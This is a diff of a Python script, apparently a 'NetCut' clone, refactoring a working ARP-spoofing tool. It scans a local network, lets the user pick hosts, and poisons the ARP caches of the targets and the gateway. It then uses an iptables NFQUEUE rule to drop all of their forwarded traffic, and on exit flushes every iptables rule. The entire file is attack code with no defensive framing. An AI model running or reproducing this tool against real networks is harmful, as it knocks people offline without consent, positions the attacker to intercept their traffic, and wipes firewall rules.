@@ -11,115 +11,140 @@ import time
 from termcolor import colored
 
 
-class NetworkScanner:
-    
-    def __init__(self, ip):
-        self.is_root()
+def has_root():
+    return os.geteuid() == 0
 
-        self.ip = ip
-        self.clients_list = []
-        self.default_gateway = ""
-        self.client_index = None
-        self.client_ip = None
-        self.client_mac = None
-        self.gateway_ip = None
-        self.gateway_mac = None
 
-        self.print_clients()
-        self.get_info()
+def gateway_address():
+    gateways = netifaces.gateways()
+    default_address = gateways["default"][netifaces.AF_INET][0]
+    return default_address
 
-    def is_root(self):
-        if os.geteuid() == 0:
-            print(colored("[+] Running as Root", "green"))
+
+def connected_clients(gateway_address, ip_range):
+    arp_request = scapy.ARP(pdst=ip_range)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_request_broadcast = broadcast/arp_request
+    response = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
+    clients = []
+    for client in response:
+        client_info = {"ip" : client[1].psrc, "mac" : client[1].src}
+        clients.append(client_info)
+    return clients
+
+
+class ARPSpoof:
+    def __init__(self, target, ip_range, gateway):
+        self._to_spoof = False
+        self.target = target
+        self.gateway = gateway
+
+    def send_spoof_packet(self, target, spoof_ip):
+        packet = scapy.ARP(
+            op=2,
+            pdst=target["ip"],
+            hwdst=target["mac"],
+            psrc=spoof_ip
+        )
+        scapy.send(packet, verbose=False)
+
+    def send_unspoof_packet(self, target, source):
+        packet = scapy.ARP(
+            op=2,
+            pdst=target["ip"],
+            hwdst=target["mac"],
+            psrc=source["ip"],
+            hwsrc=source["mac"]
+        )
+        scapy.send(packet, verbose=False)
+
+    def start(self, threaded=True):
+        self._to_spoof = True
+        if threaded:
+            t = threading.Thread(target=self._start)
+            t.start()
+            return t
         else:
-            print(colored("[-] Please run as Root... Quitting!!", "red"))
-            sys.exit(1)
+            self._start()
 
-    def get_gatewayIP(self):
-        gateways = netifaces.gateways()
-        self.default_gateway = gateways['default'][netifaces.AF_INET][0]
+    def _start(self):
+        while True:
+            if not self._to_spoof:
+                break
+            self.send_spoof_packet(self.target, self.gateway["ip"])
+            self.send_spoof_packet(self.gateway, self.target["ip"])
+            time.sleep(1)
 
-    def net_scanner(self):
-        arp_request = scapy.ARP(pdst=self.ip)
-        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
-        arp_request_broadcast = broadcast/arp_request
-        response_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-
-        self.get_gatewayIP()
-
-        for client in response_list:
-            client_dict = {"ip" : client[1].psrc, "mac" : client[1].src}
-            self.clients_list.append(client_dict)
-
-    def print_clients(self):
-        self.net_scanner()
-        print(colored("\nGateway IP: ", "red") + colored(self.default_gateway, "green", attrs=["bold"]) + colored(" --> ", "blue") + colored(str(len(self.clients_list)), "green", attrs=["bold"]) + colored(" hosts are up.", "red"))
-        print(colored("\nSNo.\t\tIP Address\t\tMAC Address", "yellow", attrs=["bold"]))
-        print(colored("---------------------------------------------------------", "yellow", attrs=["bold"]))
-        for index in range(1, len(self.clients_list)):
-            print(colored("[" + str(index) + "]" + "\t\t" + self.clients_list[index]["ip"] + "\t\t" + self.clients_list[index]["mac"], "cyan")) 
+    def stop(self):
+        self._to_spoof = False
+        time.sleep(1)
+        self.send_unspoof_packet(self.target, self.gateway)
+        self.send_unspoof_packet(self.gateway, self.target)
 
 
-class ARPSpoof(NetworkScanner):
-    
-    def get_info(self):
-        print(colored("\nSelect a client to kick them out:-", "yellow"))
-        try:
-        	self.client_index = int(input(colored("NetCut>", "red", attrs=["bold"])))
-        except KeyboardInterrupt:
-        	print(colored("\n[-] CTRL-C Detected... Quitting!", "red"))
-        	sys.exit(1)
-        
-        self.client_ip = self.clients_list[self.client_index]["ip"]
-        self.client_mac = self.clients_list[self.client_index]["mac"]
+def prompt_for_targets(clients):
+    for i, client in enumerate(clients, 1):
+        info = "[{index}]\t\t{ip_addr}\t\t{mac_addr}".format(
+            index=i,
+            ip_addr=client["ip"],
+            mac_addr=client["mac"]
+        )
+        print(colored(info, "cyan"))
 
-        self.gateway_ip = self.clients_list[0]["ip"]
-        self.gateway_mac = self.clients_list[0]["mac"]
-
-    def arp_spoof(self, target_ip, target_mac, spoof_ip):
-        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
-        scapy.send(packet, verbose=False)
-
-    def restore_arp_spoof(self, destination_ip, destination_mac, source_ip, source_mac):
-        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
-        scapy.send(packet, verbose=False)
-
-    def perform_arp_spoof(self):
-        try:
-            while True:
-                print(colored("\r[+] Spoofing Target", "green"), end="")
-                self.arp_spoof(self.client_ip, self.client_mac, self.gateway_ip)
-                self.arp_spoof(self.gateway_ip, self.gateway_mac, self.client_ip)
-                time.sleep(1)
-        except KeyboardInterrupt:
-            print(colored("\n[-] CTRL+C detected.... Reverting the changes.... Please wait!!", "red"))
-            self.restore_arp_spoof(self.client_ip, self.client_mac, self.gateway_ip, self.gateway_mac)
-            self.restore_arp_spoof(self.gateway_ip, self.gateway_mac, self.client_ip, self.client_mac)
+    indices = input(colored("NetCut>", "red", attrs=["bold"]))
+    if not indices:
+        return []
+    indices = map(int, indices.split(","))
+    targets = [clients[index-1] for index in indices]
+    return targets
 
 
-class NetCut():
-    
-    def process_packet(self, packet):
-        packet.drop()
+class InternetControl:
+    def __init__(self):
+        self.targets = []
 
-    def net_cut(self):
-        try:
-            subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
+    def add_target(self, target):
+        self.targets.append(target)
 
-            print(colored("\n[+] Started Capturing Packets....", "green"))
-            queue = netfilterqueue.NetfilterQueue()
-            queue.bind(0, self.process_packet)
+    def deny(self, threaded=True):
+        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
+        queue = netfilterqueue.NetfilterQueue()
+        queue.bind(0, lambda packet: packet.drop())
+        for target in self.targets:
+            target.start()
+        if threaded:
+            t = threading.Thread(target=queue.run)
+            t.start()
+            return t
+        else:
             queue.run()
 
-        except KeyboardInterrupt:
-            print(colored("\n[-] CTRL-C Detected.... Quitting!!!", "red"))
-            subprocess.call(["iptables", "--flush"])
+    def restore(self):
+        for target in self.targets:
+            target.stop()
+        subprocess.call(["iptables", "--flush"])
 
 
 if __name__ == '__main__':
-	
-	spoofer = ARPSpoof("192.168.1.0/24")
-	threading.Thread(target=spoofer.perform_arp_spoof, args=()).start()
+    if not has_root():
+        print(colored("[-] Please run as Root... Quitting!!", "red"))
+        sys.exit(1)
+    print(colored("[+] Running as Root", "green"))
+    gateway_ip = gateway_address()
+    print(colored("[+] Gateway IP: {}".format(gateway_ip), "red"))
 
-	netcut = NetCut()
-	threading.Thread(target=netcut.net_cut, args=()).start()
+    ip_range = "192.168.1.0/24"
+    clients = connected_clients(gateway_ip, ip_range)
+    gateway = clients[0]
+    targets = prompt_for_targets(clients[1:])
+    network = InternetControl()
+    for target in targets:
+        print(colored("[+] Spoofing Target: {}", "green").format(target["ip"]))
+        network.add_target(ARPSpoof(target, ip_range, gateway))
+    try:
+        network.deny(threaded=False)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        network.restore()
+
